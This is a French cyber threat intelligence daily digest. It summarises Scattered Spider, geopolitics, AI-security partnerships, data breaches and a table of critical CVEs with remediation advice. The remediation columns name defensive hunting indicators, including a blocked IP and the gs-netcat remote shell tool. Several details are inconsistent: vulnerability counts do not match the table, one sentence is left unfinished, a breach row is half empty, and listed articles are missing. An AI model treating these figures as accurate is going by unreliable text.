# Table des matières
* [Analyse Stratégique](#analyse-strategique)
* [Synthèses](#syntheses)
  * [Synthèse des acteurs malveillants](#synthese-des-acteurs-malveillants)
  * [Synthèse de l'actualité géopolitique](#synthese-geopolitique)
  * [Synthèse réglementaire et juridique](#synthese-reglementaire)
  * [Synthèse des violations de données](#synthese-des-violations-de-donnees)
  * [Synthèse des vulnérabilités critiques](#synthese-des-vulnerabilites-critiques)
* [Articles](#articles)
  * [ZypeerShell : un nouveau webshell PHP open-source intégrant un déploiement GSocket](#zypeershell-un-nouveau-webshell-php-open-source-integrant-un-deploiement-gsocket)
  * [Scattered Spider : deux membres présumés plaident coupables pour la cyberattaque contre TfL (39 M£)](#scattered-spider-deux-membres-presumes-plaident-coupables-pour-la-cyberattaque-contre-tfl-39-m)
  * [Tata Electronics confirme une cyberattaque : World Leaks publie 630 Go de présumés secrets Apple et Tesla](#tata-electronics-confirme-une-cyberattaque-world-leaks-publie-630-go-de-presumes-secrets-apple-et-tesla)
  * [Klue : nouvelle compromission de données impliquant LastPass](#klue-nouvelle-compromission-de-donnees-impliquant-lastpass)
  * [Hakodate (Japon) : un agent municipal accède illicitement au PC d'un collègue et dérobe des données personnelles](#hakodate-japon-un-agent-municipal-accede-illicitement-au-pc-dun-collegue-et-derobe-des-donnees-personnelles)
  * [Novo Nordisk enquête sur une violation de données après une tentative d'extorsion de 25 M$ par FulcrumSec](#novo-nordisk-enquete-sur-une-violation-de-donnees-apres-une-tentative-dextorsion-de-25-m-par-fulcrumsec)
  * [Nintendo of America : fuite de données d'enquêtes employés via la plateforme tierce TinyPulse](#nintendo-of-america-fuite-de-donnees-denquetes-employes-via-la-plateforme-tierce-tinypulse)

---

<div id="analyse-strategique"></div>

# ANALYSE STRATÉGIQUE

La veille CTI du jour est largement dominée par les vulnérabilités (56 occurrences), signalant une pression intense sur les équipes SOC et patch management ; une consolidation rapide des CVE critiques et exploits PoC doit être priorisée. Le volet géopolitique (6 articles) confirme un contexte international instable avec de possibles répercussions sur les infrastructures critiques européennes. La légère activité des acteurs de la menace (1 signalement) et deux fuites de données. Le front réglementaire (2 items) requiert une veille rapprochée sur les évolutions NIS2 et AI Act impactant les obligations de notification. Le volume global d’articles traités (7) reste modéré, suggérant une journée d’analyse tactique, croiser les CVE avec l’exposition，et pre-positionner les communications de crise en cas d’exploitation。

---

<div id="syntheses"></div>

# SYNTHÈSES

<div id="synthese-des-acteurs-malveillants"></div>

## Synthèse des acteurs malveillants

| Nom de l'acteur | Secteur(s) ciblé(s) | Mode opératoire | TTP MITRE ATT&CK | Source(s) |
|---|---|---|---|---|
| **Scattered Spider** | Transports, Télécommunications, Retail, Hôtellerie, Santé | Phishing ciblé et ingénierie sociale de helpdesks pour réinitialisation MFA, obtention d'accès via identifiants valides, mouvement latéral et déploiement de ransomware. | T1566, T1078, T1486 | [https://databreaches.net/2026/06/22/two-men-believed-to-part-of-scattered-spiders-plead-guilty-over-39m-tfl-cyber-attack/](https://databreaches.net/2026/06/22/two-men-believed-to-part-of-scattered-spiders-plead-guilty-over-39m-tfl-cyber-attack/) |

---

<div id="synthese-geopolitique"></div>

## Synthèse géopolitique

| Pays/Région | Secteur | Thème | Description | Source(s) |
|---|---|---|---|---|
| **Amérique latine, Amérique du Nord, Caraïbes** | Affaires étrangères et géopolitique | Doctrine Donroe/Monroe revisitée et reconquête américaine de l'Amérique latine | L'administration Trump applique une stratégie multidimensionale en Amérique latine combinant pression économique, opérations militaires ciblées (arrestation de Maduro au Venezuela, remplacé par Delcy Rodríguez qui rompt les livraisons de pétrole à Cuba) et levier judiciaire (retrait de la concession portuaire liée à Hong Kong au Panama). Le Mexique cède sous la menace de sanctions. Cuba s'oriente vers une libéralisation économique ouvrant l'accès aux acteurs financiers américains. Un réseau d'alliés régionaux d'extrême droite (Milei, Bukele, Kast, désormais De la Espriella en Colombie suite à l'élection du 21 juin) consolide cette sphère d'influence. Le test décisif demeure l'élection présidentielle brésilienne, dont l'issue pourrait sceller le retour d'une hégémonie américaine sur le continent face à la Chine. | [https://www.iris-france.org/trump-amerique-latine-succes-de-la-doctrine-donroe/](https://www.iris-france.org/trump-amerique-latine-succes-de-la-doctrine-donroe/) |
| **France, Europe** | Défense et sécurité intérieure / démocratie | Bilan des ingérences numériques étrangères lors des municipales 2026 et perspectives pour la présidentielle 2027 | Le rapport Viginum présenté par le Premier ministre le 11 juin 2026 dresse un bilan contrasté de la protection du débat public lors des municipales des 15 et 22 mars 2026. Si le niveau de menace a été qualifié d'élevé en raison du contexte international (guerre en Ukraine, conflit au Proche-Orient), l'analyse suggère une possible surestimation des INE. Quatre campagnes majeures d'ingérence impliquant des acteurs étatiques et non étatiques ont été caractérisées, révélant une diversification préoccupante des méthodes. À moins d'un an de la présidentielle 2027, identifiée comme rendez-vous démocratique à haut risque, la vigilance s'impose sur les auteurs émergents de manipulation informationnelle. | [https://www.iris-france.org/ingerences-numeriques-etrangeres-une-menace-surestimee-lors-des-municipales-2026/](https://www.iris-france.org/ingerences-numeriques-etrangeres-une-menace-surestimee-lors-des-municipales-2026/) |
| **France, Europe, États-Unis** | Renseignement intérieur / industrie de défense et sécurité | Souveraineté numérique : la DGSI remplace Palantir par ChapsVision (Argonos) | Annoncé le 16 juin 2026 par Sébastien Lecornu, le choix de la DGSI de remplacer progressivement la solution américaine Palantir (utilisée depuis 2015 et renouvelée pour trois ans seulement six mois plus tôt) par la solution française Argonos de ChapsVision constitue un tournant stratégique. Ce basculement, accéléré par le débat sur les dépendances critiques vis-à-vis des technologies américaines soumises au droit extraterritorial (Cloud Act, FISA 702), vise à reprendre le contrôle sur le « système d'exploitation de données » du renseignement intérieur. ChapsVision, déjà choisie par d'autres services européens et renforcée par l'acquisition d'Owlint, s'impose comme un champion national de l'OSINT et de l'analyse de données massives. Toutefois, l'opacité persiste sur le calendrier de transition, la cohabitation avec Palantir et les garanties en matière de libertés publiques et de contrôle démocratique. | [https://www.portail-ie.fr/univers/2026/chapsvision-choisi-par-la-dgsi-un-choix-souverain-important-pour-la-france/](https://www.portail-ie.fr/univers/2026/chapsvision-choisi-par-la-dgsi-un-choix-souverain-important-pour-la-france/) |
| **Monde, États-Unis** | Technologie / cybersécurité enterprise | Partenariat IBM-OpenAI pour l'intégration de l'IA générative en cyberdéfense : enjeux de souveraineté et de dépendance fournisseur | Le partenariat entre IBM et OpenAI pour intégrer des LLM frontier dans la cyberdéfense enterprise soulève des questions stratégiques majeures. L'externalisation de la détection et de l'analyse d'incidents sensibles vers des modèles tiers implique un transfert de données potentiellement sensibles vers des infrastructures soumises à des juridictions extraterritoriales (Cloud Act américain). Le contrôle des modèles utilisés pour analyser des incidents critiques devient un enjeu de souveraineté pour les organisations, en particulier dans les secteurs régulés (défense, santé, finance). Ce partenariat illustre la tension croissante entre la rapidité d'adoption de l'IA générative et la maîtrise des dépendances critiques. | [https://www.digitimes.com/news/a20260623VL203/openai-ibm-ai-infrastructure-cybersecurity-micron.html](https://www.digitimes.com/news/a20260623VL203/openai-ibm-ai-infrastructure-cybersecurity-micron.html)<br>[https://mastobot.ping.moi/@Bobe_bot/116797421228383505](https://mastobot.ping.moi/@Bobe_bot/116797421228383505) |
| **Monde** | Cybersécurité / grand public et entreprises | Démystification de l'expression « military-grade encryption » dans le marketing des VPN | L'expression « military-grade encryption », omniprésente dans le marketing des applications VPN et de sécurité, constitue un abus de langage davantage qu'une réelle différentiation technique. L'algorithme sous-jacent (généralement AES-256) est solide et standardisé, mais la sécurité effective repose sur l'implémentation, la gestion des clés, l'entropie, la configuration des protocoles et la sécurité de l'environnement d'exécution. Un algorithme robuste mal intégré ou accompagné de pratiques défaillantes (gestion des clés, logging, compromission de l'infrastructure) demeure une surface d'attaque significative. Ce type de marketing abusif brouille la perception du risque par les utilisateurs et les décideurs. | [https://www.bgr.com/2196840/vpn-military-grade-encryption-explained/](https://www.bgr.com/2196840/vpn-military-grade-encryption-explained/)<br>[https://mastobot.ping.moi/@Bobe_bot/116797421131557068](https://mastobot.ping.moi/@Bobe_bot/116797421131557068) |
| **Asie du Sud, Chine, Europe, Amérique du Nord** | Cybercriminalité / tourisme et hôtellerie | Le Sri Lanka devient un hub majeur de cyberescroquerie (pig butchering) exploitant sa filière touristique | Le Sri Lanka connaît une explosion des activités de cyberescroquerie, avec plus de 700 arrestations de ressortissants étrangers (principalement chinois, vietnamiens, cambodgiens et indiens) depuis le 1er janvier 2026. Ces réseaux opèrent depuis des étages d'immeubles de bureaux et des hôtels, utilisant des visas touristiques et profitant de la crise du secteur (40 à 50 chambres réservées et payées d'avance sur plusieurs mois) pour s'implanter. Les fraudes incluent des arnaques à la loterie et du pig butchering ciblant des victimes chinoises, européennes et américaines via les réseaux sociaux et applications de rencontre. Le phénomène illustre la diversification géographique des hubs cybercriminels asiatiques, après le Cambodge et le Myanmar, et l'instrumentalisation des filières touristiques vulnérables. | [https://www.lemonde.fr/international/article/2026/06/22/le-sri-lanka-nouveau-terrain-de-predilection-des-escrocs-en-ligne_6708032_3210.html](https://www.lemonde.fr/international/article/2026/06/22/le-sri-lanka-nouveau-terrain-de-predilection-des-escrocs-en-ligne_6708032_3210.html) |

---

<div id="synthese-reglementaire"></div>

## Synthèse réglementaire et juridique

| Titre | Auteur/Organisme | Date | Juridiction | Référence | Description | Source(s) |
|---|---|---|---|---|---|---|
| — | OpenAI / Proofpoint | 2026-06-22 | International (initiative privée, siège Proofpoint : Californie, USA) |  | Proofpoint a annoncé le 22 juin 2026 son adhésion au programme OpenAI Daybreak Cyber Partner Program. Ce partenariat permet à Proofpoint d'intégrer le modèle GPT-5.5 d'OpenAI dans ses produits, services et flux de travail de sécurité managés (sans exposition directe des clients aux modèles OpenAI). Les cas d'usage comprennent l'investigation des menaces, l'enrichissement d'alertes, l'analyse de la renseignement sur les menaces et la réponse aux incidents. Proofpoint prévoit également d'étendre sa plateforme Satori (IA agentique) en s'appuyant sur les modèles OpenAI. Les deux entités collaboreront sur les bonnes pratiques de gouvernance IA, de surveillance, de contrôles de sécurité et de prévention des abus. | [https://www.proofpoint.com/us/newsroom/press-releases/proofpoint-joins-openai-daybreak-cyber-partner-program-advance-responsible](https://www.proofpoint.com/us/newsroom/press-releases/proofpoint-joins-openai-daybreak-cyber-partner-program-advance-responsible) |
| — | Global Cyber Alliance (GCA) – Internet Integrity Program | 2026-06-23 | International (atelier tenu à Édimbourg, Royaume-Uni, sous règle Chatham House) |  | La GCA a organisé le 18 mai 2026 à l'Edinburgh International Conference Centre la troisième édition de son Internet Integrity Workshop, consacrée à la problématique des proxys résidentiels et des infrastructures compromises. L'événement s'est tenu sous la règle Chatham House, ce qui favorise la libre expression d'acteurs variés (régulateurs, opérateurs, chercheurs, forces de l'ordre) sur un sujet où la coopération transnationale est essentielle. Le format atelier vise à faire émerger des bonnes pratiques, des principes de signalement et de remédiation, ainsi que des pistes de coordination public-privé pour limiter l'abus d'infrastructures résidentielles compromises comme relais d'activité cybercriminelle. En l'absence de contenu décisionnel public, l'intérêt pour la CTI réside dans l'identification d'un cadre de discussion structuré entre parties prenantes clés sur une menace d'infrastructure récurrente. | [https://globalcyberalliance.org/internet-integrity-workshop-iii-residential-proxies-and-infected-infrastructure/](https://globalcyberalliance.org/internet-integrity-workshop-iii-residential-proxies-and-infected-infrastructure/) |

---

<div id="synthese-des-violations-de-donnees"></div>

## Synthèse des violations de données

| Secteur | Victime | Données compromises | Volume estimé | Source(s) |
|---|---|---|---|---|
| **Administration publique / Loisirs / Environnement (gouvernement État du Texas)** | Texas Parks and Wildlife Department (TPWD) | Adresses e-mail, adresses postales, numéros de téléphone, numéros de permis de conduire, numéros de passeport (si fournis) | 3000000 | [https://securityaffairs.com/194023/data-breach/texas-parks-wildlife-tpwd-data-breach-impacts-3-million-people.html](https://securityaffairs.com/194023/data-breach/texas-parks-wildlife-tpwd-data-breach-impacts-3-million-people.html) |
| **** | Utilisateurs d'appareils Apple A12/A13/S4/S5 (iPhone XS/XR/11, iPad, Apple Watch) |  | Inconnu | [https://securityaffairs.com/193965/hacking/usbliter8-brings-unpatchable-bootrom-exploit-to-apple-a12-and-a13-devices.html](https://securityaffairs.com/193965/hacking/usbliter8-brings-unpatchable-bootrom-exploit-to-apple-a12-and-a13-devices.html) |

---

<div id="synthese-des-vulnerabilites-critiques"></div>

## Synthèse des vulnérabilités critiques

| CVE-ID | Score CVSS | EPSS | CISA KEV | Produit affecté | Type de vulnérabilité | Impact | Exploitation | Mesures de contournement | Source(s) |
|---|---|---|---|---|---|---|---|---|---|
| **CVE-2013-3307** | 8.3 | 5.62% | FALSE | E1000, E1200, E3200 | CWE-78 Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | Réseau de 4 300+ routeurs transformés en infrastructure de reconnaissance et de relais cachant l'origine réelle des attaquants. Usurpation d'identité réseau (IP résidentielles compromises), capacité de scan distribué à grande échelle, pivot potentiel vers les réseaux internes, compromission de la confidentialité du trafic traversant les routeurs, et risque d'utilisation DDoS en pointant les scans DNS vers des résolveurs. | Active | Remplacer immédiatement les routeurs Linksys et D-Link en fin de vie ; mettre à jour le firmware des équipements encore supportés ; segmenter les IoT/routeurs sur un VLAN isolé ; bloquer l'IP 107.150.106.14 et les IOC associés au niveau du pare-feu ; désactiver l'administration distante (WAN) ; auditer la présence de services SSH non autorisés sur le port 2332 ; réinitialiser aux paramètres d'usine les équipements compromis. | [https://thehackernews.com/2026/06/arystinger-malware-infects-4300-legacy.html](https://thehackernews.com/2026/06/arystinger-malware-infects-4300-legacy.html)<br>[https://securityaffairs.com/193987/security/4300-outdated-routers-hijacked-in-stealthy-spy-infrastructure-by-arystinger-malware.html](https://securityaffairs.com/193987/security/4300-outdated-routers-hijacked-in-stealthy-spy-infrastructure-by-arystinger-malware.html) |
| **CVE-2016-5681** | N/A | 11.93% | FALSE | Routeurs D-Link (en particulier DIR-850L) basés sur puces Realtek RTL819X | n/a | Plus de 4 300 routeurs D-Link compromis utilisés comme infrastructure de reconnaissance et relais d'anonymisation. Le modèle DIR-850L est particulièrement exposé. Risques : compromission de la confidentialité du trafic, scans distribués à grande échelle, pivots vers les réseaux internes, et exposition à des attaques DDoS en utilisant les scans DNS comme vecteur. | Active | Remplacer les routeurs D-Link EoL (DIR-850L inclus) par du matériel supporté ; mettre à jour le firmware des équipements encore maintenus ; segmenter les IoT ; bloquer l'IP 107.150.106.14 et IOC associés ; désactiver l'accès admin WAN ; rechercher le service SSH port 2332 et autres IOC ; réinitialiser aux paramètres d'usine les équipements compromis. | [https://thehackernews.com/2026/06/arystinger-malware-infects-4300-legacy.html](https://thehackernews.com/2026/06/arystinger-malware-infects-4300-legacy.html)<br>[https://securityaffairs.com/193987/security/4300-outdated-routers-hijacked-in-stealthy-spy-infrastructure-by-arystinger-malware.html](https://securityaffairs.com/193987/security/4300-outdated-routers-hijacked-in-stealthy-spy-infrastructure-by-arystinger-malware.html) |
| **CVE-2025-11837** | 8.1 | 0.77% | FALSE | Malware Remover | CWE-94 | Compromission de NAS QNAP transformés en nœuds d'exécution puissants au sein du réseau AryStinger, avec capacité de reconnaissance interne et externe, exécution de code arbitraire à la demande, et persistance via gs-netcat. Risque élevé de mouvement latéral vers le SI d'entreprise et d'exfiltration de données stockées sur les NAS. | Active | Appliquer immédiatement le correctif de novembre 2025 sur tous les NAS QNAP ; isoler les NAS non patchés ; désactiver Malware Remover si non requis ; bloquer les IOC AryStinger (107.150.106.14) ; rechercher gs-netcat et autres indicateurs ; auditer l'intégrité du firmware ; segmenter les NAS du reste du réseau. | [https://thehackernews.com/2026/06/arystinger-malware-infects-4300-legacy.html](https://thehackernews.com/2026/06/arystinger-malware-infects-4300-legacy.html) |
| **CVE-2026-6645** | 7.3 | N/A | FALSE | Print Deploy | CWE-427 Uncontrolled Search Path Element | Une exploitation réussie permet l'exécution de code arbitraire dans le contexte du compte utilisateur exécutant PaperCut Print Deploy Client, avec un risque d'élévation de privilèges, de persistance, et de pivot au sein du SI d'entreprise utilisant cette solution de gestion d'impression. | Theoretical | Mettre à jour PaperCut Print Deploy Client vers la version v2699 (ou ultérieure) sans délai en s'appuyant sur le bulletin de sécurité de l'éditeur (papercut-ng-mf-security-bulletin-june-2026). Isoler les postes qui ne peuvent pas être patchés immédiatement et restreindre les privilèges du compte de service. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0789/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0789/)<br>[https://www.papercut.com/kb/Main/papercut-ng-mf-security-bulletin-june-2026/](https://www.papercut.com/kb/Main/papercut-ng-mf-security-bulletin-june-2026/) |
| **CVE-2026-12003** | 5.3 | 0.14% | FALSE | CPython | CWE-427 | Risque d'exfiltration de données traitées par des applications Python et de contournement des mécanismes de sécurité Windows (AppLocker, UAC, journalisation), pouvant conduire à un accès non autorisé à des informations sensibles et à un mouvement latéral. | Theoretical | Appliquer le dernier correctif de sécurité CPython sur toutes les installations Windows 3.11.x à 3.15.x impactées ; isoler les hôtes non patchés ; restreindre l'exécution Python via AppLocker/WDAC ; régénérer les secrets utilisés par les applications Python ; surveiller l'activité python.exe via l'EDR. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0790/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0790/)<br>[https://mail.python.org/archives/list/security-announce@python.org/thread/JIFOBO7UX3LY4VJKJUOKYJV62CFR2IRH/](https://mail.python.org/archives/list/security-announce@python.org/thread/JIFOBO7UX3LY4VJKJUOKYJV62CFR2IRH/) |
| **CVE-2026-12437** | 8.3 | 0.28% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire dans le contexte de l'utilisateur naviguant sur des pages web malveillantes, pouvant conduire à un compromission du poste, vol de session, exfiltration de données et pivot au sein du SI. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) via le mécanisme de mise à jour automatique ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12437](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12437) |
| **CVE-2026-12439** | 8.8 | 0.31% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire, de vol de session ou d'exfiltration de données via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12439](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12439) |
| **CVE-2026-12440** | 9.6 | 0.31% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12440](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12440) |
| **CVE-2026-12441** | 8.8 | 0.29% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12441](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12441) |
| **CVE-2026-12443** | 8.8 | 0.52% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12443](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12443) |
| **CVE-2026-12444** | 5.5 | 0.14% | FALSE | Chrome | CWE-125 Out of bounds read | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12444) |
| **CVE-2026-12445** | 7.5 | 0.20% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12445](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12445) |
| **CVE-2026-12446** | 4.3 | 0.24% | FALSE | Chrome | Insufficient data validation | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12446](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12446) |
| **CVE-2026-12447** | 8.8 | 0.40% | FALSE | Chrome | CWE-122 Heap buffer overflow | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12447](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12447) |
| **CVE-2026-12449** | 7.8 | 0.13% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12449](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12449) |
| **CVE-2026-12451** | 8.3 | 0.22% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12451](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12451) |
| **CVE-2026-12452** | 8.8 | 0.25% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12452](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12452) |
| **CVE-2026-12453** | 4.2 | 0.18% | FALSE | Chrome | CWE-20 Insufficient validation of untrusted input | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12453](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12453) |
| **CVE-2026-12454** | 8.3 | 0.18% | FALSE | Chrome | CWE-362 Race | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12454](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12454) |
| **CVE-2026-12455** | 7.5 | 0.22% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12455](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12455) |
| **CVE-2026-12456** | 4.2 | 0.13% | FALSE | Chrome | CWE-20 Insufficient validation of untrusted input | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12456](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12456) |
| **CVE-2026-12457** | 4.2 | 0.19% | FALSE | Chrome | Insufficient data validation | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12457](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12457) |
